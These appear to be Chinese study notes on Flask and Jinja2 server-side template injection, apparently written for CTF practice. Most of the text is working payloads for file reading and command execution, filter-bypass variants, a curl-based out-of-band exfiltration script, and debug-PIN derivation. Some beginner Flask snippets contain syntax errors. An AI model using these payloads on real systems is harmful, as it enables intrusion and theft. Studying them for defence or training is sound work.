# ,python venv环境安装

`cd /opt/flask1`

`source ./bin/activate`

#运行完发现命令行前面多了个(flask)

`deactivate`          #退出虚拟环境

# flask

flask是一个使用python编写的轻量级Web应用框架

模板引擎使用Jinja2

`vim demo.py`       内容如下

```
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
	return "hello,ggbo"
	
if __name__='__main__':
	app.run()
```

`app = Flask(__name__)`是获取名字,内部运行时name==main,外部运行时name等于python文件的文件名

`if __name__='__main__':
	app.run()`

就是只有内部运行时才会执行

`python3 demo.py`

只能在虚拟机中内部访问

把最后一行代码改为

`app.run(host='0.0.0.0')`

可以在物理主机上也访问

如果改为:

`app.run(debug=True,host='0.0.0.0')`

#调试程序的时候可以用,当配置修改的时候,会重启服务,成熟的产品不可以用它

也可以在app.run()中加port=来指定端口,但是换端口之后debug无法自动更改端口,需要重启服务



# flask变量及方法

demo.py

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name
	
if __name__='__main__':
	app.run()
```

`<name>`表示传入的参数,访问url是加上/aaa/ggbo就会显示

hello,ggbo

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name

@app.route('/int/<int:postID>')
def id(postID)
	return " %d " % postID
	
if __name__='__main__':
	app.run()
```

只接受整型的常量

## Flask HTTP方法

示例代码:

```
@app.route('/login',methods = ['POST','GET'])
def login():
	if request.method == 'POST':
		print(1)
		user = request.form['ben']
		return redirect(url_for('success',name = user))         #redirect重定向到/success/user
	else:
		print(2)
		user = request.args.get('ben')
		return redirect(url_for('success',name = user))
```



# Flask模板

## 视图函数

主要作用:生成请求的响应

处理业务逻辑>>>返回相应内容

把业务逻辑和表现内容放在一起,会增加代码复杂度和维护成本



**使用模板:**使用静态的页面html展示动态的内容(运算和数据分开)

模板是一个相应文本的文件,其中占用符(变量)表示动态部分,告诉模板引擎器具体的值需要从数据中获取

使用真实值替换白能量,在返回最终得到的字符串,这个过程称为**"渲染"**

Flask使用Jinja2模板引擎来进行渲染



## render_template

加载html文件,默认文件路径在templates下

![image-20240416234353046](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234353046.png)

## render_template_string

用于渲染html字符串,直接定义内容

![image-20240416234416626](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234416626.png)



# 模板注入漏洞

## Flask漏洞

成因:

渲染模板时,没有严格控制对用户的输入

可能造成任意文件读取和RCE远程控制后台系统

 ![image-20240417170044693](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170044693.png)



![image-20240417170219297](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170219297.png)



## SSTI

![image-20240417170348678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170348678.png)



# 继承关系和魔术方法

![image-20240417171115920](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171115920.png)

![image-20240417171831466](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171831466.png)

也可以使用:

`print(c.__class__.__mro__)`   #直接显示上面的所有类

`print(c.__class__.__mro__[1].__subclasses__())`

#找到B类下面的所有类(数组形式)

`print(c.__class__.__mro__[1].__subclasses__()[1])`

#调用D



## 魔术方法

`__class_`:查找当前类型的所属对象

`__base__`:沿着父子类往上找一个类

`__mro__`:查找当前类上面的所有类

`__subclasses__()`:查找所有子类

`__init__`:查看类是否重载

`__globals__`:函数会以字典的形式返回当前对象的全部全局变量

`{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()}}`



# 常用注入模块

## 文件读取

### 寻找子类`_frozen_importlib_external.FileLoader`

使用**ssti脚本.py**

- 要先找到object路径

![image-20240422110612517](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422110612517.png)

文件读取payload:

`name={{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/flag")}}`

读取配置文件下的flag:

`{{url_for.__globals__['current_app'].config.flag}}`

`{get_flashed_messages.__globals__['current_app'].config.flag}}`

### 内建eval函数执行命令

使用**ssti寻找eval函数.py**

![image-20240422130436945](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130436945.png)

`name={{''.__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}`

对于`__import__("os").popen("cat /etc/passwd").read()`这段代码,chatgpt解释如下:

1. `__import__("os")`: 这是一种动态导入模块的方式。`__import__()` 是 Python 中的一个内置函数，它允许在运行时动态导入模块。在这里，它动态地导入了 `os` 模块。
2. `.popen("cat /etc/passwd")`: 一旦 `os` 模块被导入，`.popen()` 方法可以被调用。这个方法用于执行系统命令，并返回一个文件对象，该对象可以用于读取命令的输出。在这里，`"cat /etc/passwd"` 是要执行的系统命令，它将读取系统中的 `/etc/passwd` 文件。
3. `.read()`: 一旦 `popen` 方法返回一个文件对象，`.read()` 方法被调用以读取命令的输出。它将返回命令执行的结果。



## os模块执行命令

### 通过config,url_for调用os模块

`{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`

`{{url_for.__globals__.os.popen('cat /etc/passwd').read()}}`

`{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}`

### 在已经加载os模块的子类里直接调用os模块

![image-20240422125151116](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422125151116.png)

`{{''.__class__.__base__.__subclasses__()[422].__init__.__globals__.os.popen('id').read()}}`



## importlib类执行命令

![image-20240422130751678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130751678.png)

![image-20240422130826808](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130826808.png)



## linecache函数执行命令

![image-20240422130910765](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130910765.png)

具体payload:

![image-20240422130928943](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130928943.png)



## subprocess.Popen类执行命令

![image-20240422131003672](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131003672.png)

具体payload:

![image-20240422131024671](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131024671.png)





![image-20240422131041534](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131041534.png)

**具体数值用python脚本查找**



# 绕过双大括号过滤

## {%%}使用

![image-20240423103317262](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103317262.png)



![image-20240423103433412](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103433412.png)



![image-20240423103706681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103706681.png)

如果`''.__class__.__base__`有内容,则条件为真,返回benben

先查询到object类,object下面globals下面有popen子类

![image-20240423103913504](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103913504.png)

脚本运行结果:

`117 ---> {'code': "{% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read() %}benben{% endif %}"}`



payload:

`{% print(''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()) %}`



# 无回显ssti注入

## 反弹注入

- 通过rce反弹一个shell界面

![image-20240423111311681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111311681.png)



## 带外注入

![image-20240423111326111](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111326111.png)

先在kali上开启一个python http监听也可以用dnslog

```
import requests
url =input('请输入URL链接:')
for i in range(500):
    data = {"code":"{% if ().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('curl http://172.21.205.184/`cat /etc/passwd`').read() %}benben{% endif %}"}
    #name替换成题目中给的post方式提交的键值
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if'benben' in response.text:
                print(i,"--->",data)
                break
    except:
        pass
```



## 纯盲注

![image-20240423111133591](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111133591.png)



# 绕过过滤中括号

![image-20240423111609157](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111609157.png)

实例:

`code={{''.__class__.__base__.__subclasses__().__getitem__(117)}}`

等价于

`code={{''.__class__.__base__.__subclasses__()[117]}}`

最终payload:

`code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}}`



# 绕过单双引号过滤

![image-20240423113217953](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113217953.png)

![image-20240423113605950](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113605950.png)



payload:

`code={{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.k1](request.args.k2).read()}}`

再通过GET方式提交

`http://172.21.205.184:18080/flasklab/level/5?k1=popen&k2=cat /flag`



# 过滤器绕过下划线过滤

![image-20240423114447370](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423114447370.png)

 

`{{ users|length}}`

使用attr()来进行绕过

1.使用request方法

payload:

`code={{''|attr(request.args.k1)|attr(request.args.k2)|attr(request.args.k3)()|attr(request.args.k4)(117)|attr(request.args.k5)|attr(request.args.k6)|attr(request.args.k4)('popen')('cat /flag')|attr('read')()  }}`

再使用GET传参:

`?k1=__class__&k2=__base__&k3=__subclasses__&k4=__getitem__&k5=__init__&k6=__globals__`



2.使用unicode编码

![image-20240423171559608](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171559608.png)



3.使用16位编码

![image-20240423171656797](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171656797.png)

下划线全都用`\x5f`来代替



4.base64编码(python3中不可行)

![image-20240423171802252](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171802252.png)



5.格式化字符串

![image-20240423172103988](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423172103988.png)



# 中括号绕过点过滤

## attr()绕过

见上面



## 中括号[]代替点

python语法也可以使用`[]`来访问对象属性

![image-20240424220844727](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424220844727.png)



# 关键字过滤

![image-20240424221107979](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424221107979.png)

## 编码绕过

见上面



## '+'拼接

**注意:**使用拼接绕过关键字时,`.`好像不可以用,要使用`[]`代替

![image-20240424223454184](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424223454184.png)



## '~'拼接

![image-20240424224050017](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424224050017.png)

实战时发现hackbar上上传post参数会报错(可能是编码问题),在实际页面的框中上传即可

![image-20240424224203517](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424224203517.png)





```
{% set a='__cla' %}{% set b='ss__' %}{% set c='__ba' %}{% set d='se__' %}{% set e='__subcl' %}{% set f='asses__' %}{% set g='__in' %}{% set h='it__' %}{% set l='__gl' %}{% set i='obals__' %}{% set j='po' %}{% set k='pen' %}{{''[a~b][c~d][e~f]()[199][g~h][l~i]['os'][j~k]('cat /flag')['read']()}}
```



## 过滤器

![image-20240424230305874](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424230305874.png)

```
{% set a='__ssalc__'|reverse %}{% set b='__esab__'|reverse %}{% set c='__sessalcbus__'|reverse %}{% set d='__tini__'|reverse %}{% set e='__slabolg__'|reverse %}{% set f='nepop'|reverse %}{{''[a][b][c]()[199][d][e]['os'][f]('cat /flag')['read']()}}
```



其他过滤器:

![image-20240424231127574](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231127574.png)



## 利用python中的char

![image-20240424231148935](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231148935.png)



# length过滤器绕过数字过滤

![image-20240424231325079](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231325079.png)



![image-20240424231826968](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231826968.png)

```
{% set a='aaaa'|length*'aaaaa'|length*'aaaaaaaaaa'|length-'a'|length %}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['os']['popen']('cat /flag').read()}}
```

```
{% set a='aaaa'|length*'aaaaa'|length*'aaaaaa'|length-'aaa'|length %}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['popen']('cat /flag').read()}}
```



# 获取config文件

没有过滤时:

`{{config}}`可以直接读取



![image-20240424234453958](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424234453958.png)



![image-20240424234832797](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424234832797.png)



```
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```



# 混合过滤绕过

## dict()和join绕过＋的过滤

dict:

创建字典,键名为`__cla`,键值为`1`

join:

获取键名生成字符串

![image-20240424235806220](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424235806220.png)



## 获取符号

利用flask内置函数和对象获取符号

![image-20240425000035644](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000035644.png)

```
{% set ben=({}|select()|string()) %}{{ben}}
{% set ben=(self|select()|string()) %}{{ben}}
{% set ben=(self|string|urlencode) %}{{ben}}
{% set ben=(app.__doc__|string()) %}{{ben}}
```

![image-20240425000305054](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000305054.png)

再使用list将得到的字符串转化成列表,然后按索引拿到符号

![image-20240425000623558](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425000623558.png)



## 实例解析

### 一

![image-20240425001514687](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425001514687.png)



```
{% set a=dict(__class__=a)|join %}{% set b=dict(__base__=a)|join %}{% set c=dict(__subclasses__=a)|join %}{% set d=dict(__getitem__=a)|join %}{% set e=dict(__init__=a)|join %}{% set f=dict(__globals__=a)|join %}{% set g=dict(popen=a)|join %}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)}}
#到popen为止,不是完整的payload
```

最终payload如下:

```
{% set a=dict(__class__=a)|join %}{% set b=dict(__base__=a)|join %}{% set c=dict(__subclasses__=a)|join %}{% set d=dict(__getitem__=a)|join %}{% set e=dict(__init__=a)|join %}{% set f=dict(__globals__=a)|join %}{% set g=dict(popen=a)|join %}{% set kg={}|select()|string()|attr(d)(10) %}{% set i=(dict(cat=a)|join,kg,dict(flag=2)|join)|join %}{% set r=dict(read=a)|join %}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()}}
```



### 二

![image-20240425002845277](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425002845277.png)



![image-20240425003347779](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425003347779.png)

#因为`_`被过滤,所以要用`pop`代替`__getitem__`

![image-20240425003538996](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425003538996.png)

```
#获取空格
{% set nine=dict(aaaaaaaaa=a)|join|count %}{% set pop=dict(pop=a)|join %}{% set a=(lipsum|string|list)|attr(pop)(nine) %}{{a}}
```

最终形式:

![image-20240425004405733](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004405733.png)



# debug pin码计算

## pin码

![image-20240425004749951](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004749951.png)

## pin码生成原理

![image-20240425004822363](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425004822363.png)



前四个在这里获得:

![image-20240425005318648](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005318648.png)

### **获取用户名username**

![image-20240425005443554](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005443554.png)

### **获取app对象name属性**

![image-20240425005514798](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005514798.png)

### **获取app对象module属性**

![image-20240425005551200](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005551200.png)

### **mod的`__file__`属性**

![image-20240425005632981](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005632981.png)

### **uuid**

![image-20240425005751956](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005751956.png)

### **get_machine_id获取**

![image-20240425005935936](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425005935936.png)



![image-20240425010648994](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010648994.png)



![image-20240425010722608](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010722608.png)



python3.10

![image-20240425010758624](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010758624.png)



python3.6

![image-20240425010818627](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010818627.png)



python2.7

![image-20240425010840543](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425010840543.png)



# pin码计算ctf题目

## username

![image-20240425011204762](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011204762.png)



## modname,appname

一般为flask.app和Flask



## app.py路径

![image-20240425011851084](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011851084.png)







## mac地址(uuid)

![image-20240425011434071](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011434071.png)

判断是centos还是ubantu

![image-20240425011520597](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011520597.png)

成功访问页面返回uuid

mac地址计算时要转换成10进制



## get_machine_id

![image-20240425011649329](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425011649329.png)

把两个拼接起来就是machineid

补充:

![image-20240425172851151](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425172851151.png)



# 补充payload

```
{% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}
   {% endif %}
{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

popen被过滤可以使用open

